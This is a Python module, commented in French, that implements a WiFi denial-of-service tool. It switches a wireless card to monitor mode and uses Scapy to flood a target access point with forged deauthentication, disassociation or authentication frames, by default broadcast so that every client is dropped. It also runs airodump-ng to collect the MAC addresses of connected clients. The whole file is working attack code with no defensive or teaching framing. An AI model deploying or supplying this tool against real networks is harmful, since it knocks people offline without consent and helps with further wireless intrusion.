#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module Deauth Attack
Implémente les attaques de déconnexion WiFi
"""

import os
import time
import threading
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas, Dot11Auth

class DeauthAttack:
    """Classe pour l'attaque Deauth"""
    
    def __init__(self, network_manager, logger):
        self.network_manager = network_manager
        self.logger = logger
        self.running = False
        self.attack_thread = None
        
    def start(self, config):
        """Démarre l'attaque Deauth"""
        self.config = config
        self.running = True
        
        self.logger.log("INFO", f"Démarrage de l'attaque Deauth sur {config['target_bssid']}")
        
        # Configuration de l'interface
        self.setup_interface()
        
        # Démarrage du thread d'attaque
        self.start_attack_thread()
        
    def setup_interface(self):
        """Configure l'interface WiFi pour l'attaque"""
        interface = self.config['interface']
        channel = self.config['channel']
        
        try:
            # Mise en mode monitor
            self.network_manager.set_monitor_mode(interface)
            
            # Configuration du canal
            subprocess.run(['iwconfig', interface, 'channel', str(channel)], 
                         capture_output=True, text=True)
            
            self.logger.log("INFO", f"Interface {interface} configurée en mode monitor sur le canal {channel}")
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors de la configuration de l'interface: {str(e)}")
            raise
            
    def start_attack_thread(self):
        """Démarre le thread d'attaque"""
        self.attack_thread = threading.Thread(target=self.send_deauth_packets)
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
    def send_deauth_packets(self):
        """Envoie les paquets de déconnexion"""
        interface = self.config['interface']
        target_bssid = self.config['target_bssid']
        attack_type = self.config['attack_type']
        packet_count = self.config['packet_count']
        interval = self.config['interval'] / 1000.0  # Conversion en secondes
        broadcast = self.config['broadcast']
        continuous = self.config['continuous']
        
        self.logger.log("INFO", f"Envoi de paquets {attack_type} vers {target_bssid}")
        
        packets_sent = 0
        
        while self.running:
            try:
                # Création du paquet selon le type d'attaque
                if attack_type == "Deauth":
                    packet = self.create_deauth_packet(target_bssid, broadcast)
                elif attack_type == "Disassoc":
                    packet = self.create_disassoc_packet(target_bssid, broadcast)
                elif attack_type == "Auth":
                    packet = self.create_auth_packet(target_bssid, broadcast)
                else:
                    packet = self.create_deauth_packet(target_bssid, broadcast)
                
                # Envoi du paquet
                sendp(packet, iface=interface, verbose=False)
                packets_sent += 1
                
                self.logger.log("DEBUG", f"Paquet {attack_type} #{packets_sent} envoyé")
                
                # Vérification du nombre de paquets
                if not continuous and packets_sent >= packet_count:
                    self.logger.log("INFO", f"Attaque terminée - {packets_sent} paquets envoyés")
                    break
                    
                # Attente entre les paquets
                time.sleep(interval)
                
            except Exception as e:
                self.logger.log("ERROR", f"Erreur lors de l'envoi de paquets: {str(e)}")
                break
                
    def create_deauth_packet(self, target_bssid, broadcast=False):
        """Crée un paquet deauth"""
        if broadcast:
            # Attaque broadcast - déconnecte tous les clients
            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
        else:
            # Attaque ciblée - nécessite une liste de clients
            # Pour la démo, on utilise broadcast
            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
            
        return packet
        
    def create_disassoc_packet(self, target_bssid, broadcast=False):
        """Crée un paquet disassoc"""
        if broadcast:
            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Disas()
        else:
            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Disas()
            
        return packet
        
    def create_auth_packet(self, target_bssid, broadcast=False):
        """Crée un paquet auth (pour les attaques de type auth flood)"""
        if broadcast:
            packet = Dot11(addr1=target_bssid, addr2="00:11:22:33:44:55", addr3=target_bssid) / Dot11Auth()
        else:
            packet = Dot11(addr1=target_bssid, addr2="00:11:22:33:44:55", addr3=target_bssid) / Dot11Auth()
            
        return packet
        
    def get_connected_clients(self, target_bssid):
        """Récupère la liste des clients connectés au réseau cible"""
        clients = []
        
        try:
            # Utilisation de airodump-ng pour détecter les clients
            interface = self.config['interface']
            
            # Démarrage de airodump-ng en arrière-plan
            cmd = ['airodump-ng', '--bssid', target_bssid, '--output-format', 'csv', 
                   '--write', '/tmp/deauth_clients', interface]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Attente pour la capture
            time.sleep(5)
            
            # Arrêt du processus
            process.terminate()
            process.wait()
            
            # Lecture du fichier de sortie
            if os.path.exists('/tmp/deauth_clients-01.csv'):
                with open('/tmp/deauth_clients-01.csv', 'r') as f:
                    lines = f.readlines()
                    
                for line in lines:
                    if line.strip() and ',' in line:
                        parts = line.split(',')
                        if len(parts) > 1 and parts[0].strip():
                            mac = parts[0].strip()
                            if mac and mac != 'Station MAC' and mac != target_bssid:
                                clients.append(mac)
                                
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors de la détection des clients: {str(e)}")
            
        return clients
        
    def stop(self):
        """Arrête l'attaque Deauth"""
        self.running = False
        
        # Arrêt du thread
        if self.attack_thread:
            self.attack_thread.join(timeout=1)
            
        # Nettoyage
        self.cleanup()
        
        self.logger.log("INFO", "Attaque Deauth arrêtée")
        
    def cleanup(self):
        """Nettoie les ressources utilisées"""
        try:
            # Retour en mode managed
            self.network_manager.set_managed_mode(self.config['interface'])
            
            # Suppression des fichiers temporaires
            if os.path.exists('/tmp/deauth_clients-01.csv'):
                os.remove('/tmp/deauth_clients-01.csv')
                
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors du nettoyage: {str(e)}")
            
    def get_attack_stats(self):
        """Retourne les statistiques de l'attaque"""
        return {
            'running': self.running,
            'target_bssid': self.config.get('target_bssid', ''),
            'attack_type': self.config.get('attack_type', ''),
            'packet_count': self.config.get('packet_count', 0),
            'interval': self.config.get('interval', 0)
        } 